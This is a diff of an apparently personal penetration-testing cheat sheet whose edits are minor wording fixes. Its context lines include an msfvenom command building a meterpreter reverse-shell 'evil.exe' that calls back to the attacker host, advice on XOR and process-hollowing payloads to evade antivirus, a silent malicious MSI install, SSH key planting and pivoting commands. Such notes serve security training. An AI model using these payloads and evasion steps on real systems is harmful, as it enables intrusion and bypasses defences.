@@ -9,7 +9,8 @@
 - Re-scan against hostnames
 - Hostnames usually mean something. Put a remark in the table. For e.g, note things like clients, devs, DB etc
 - Web Services should be fully enumerated with feroxbuster/gobuster.
-	- Check Source Code for possible reveal of tech stack (ie .NET Razer)
+	- Check Source Code for possible reveal of tech stack (ie .NET Razer) or secret endpoints/apis
+	- Check versioning and google for potential exploits
 	- Login pages for default creds
 	- Wordpress sites to be wpscan
 	- file upload pages to be tested
@@ -37,7 +38,7 @@
 - if you are creating an .exe payload from csharp, use Sleep, non-emulated APIs (such as VirtualAllocExNuma) for sandbox evasion, use multiple byte XOR to encrypt your payload
 - same idea for VBA
 - for .hta code, it is jscript; XOR the shellcode, do dotnet2js, prepend an obfuscated jscript into the output .hta file from dotnet2js
-- for prependmigrate, you need to set it up as a msfvenom option when creating a payload. Note that explorer may not always work if the target user is not an interactive user (such as svc accounts, IIS blah blah)
+- for prependmigrate, you can set it up as a msfvenom option when creating a payload. Note that explorer may not always work if the target user is not an interactive user (such as svc accounts, IIS blah blah)
 ```
 msfvenom -p windows/meterpreter/reverse_tcp lhost=<kali ip> lport=443 prpendmigrateprocess=explorer.exe prependmigrate=true -f exe > evil.exe
 ```
@@ -212,7 +213,7 @@ msiexec /quiet /qn /i evil.msi
 **Via MSI Wrapper**
 - You need to have your own Windows machine. Download MSI Wrapper from (https://www.exemsi.com/download/)
 - Create an obfuscated exe payload that can bypass AV. Suggest a XOR Csharp payload or a Process Hollowing payload (this works. Tested and tried)
-- Wrap that payload using MSI Wrapper. See here for steps >>
+- Wrap that payload using MSI Wrapper. 
 
 ### Special Domain Groups
 
@@ -361,7 +362,7 @@ chown victim:victim authorized_keys
 psexec.py <domain>/<user>@<FQDN host> -k -no-pass
 ```
 
-### Port Forwarding Shenigans with Linux Host
+### Port Forwarding Shenanigans with Linux Host
 - if your owned linux host belong to another domain and you want to access a service that is exclusive to tht domain, you can use sshuttle to create a pivot through that linux host
 ```bash
 sshuttle -r root@app01.dev.local.com <Target CIDR> --ssh-cmd "ssh -i id_rsa" 
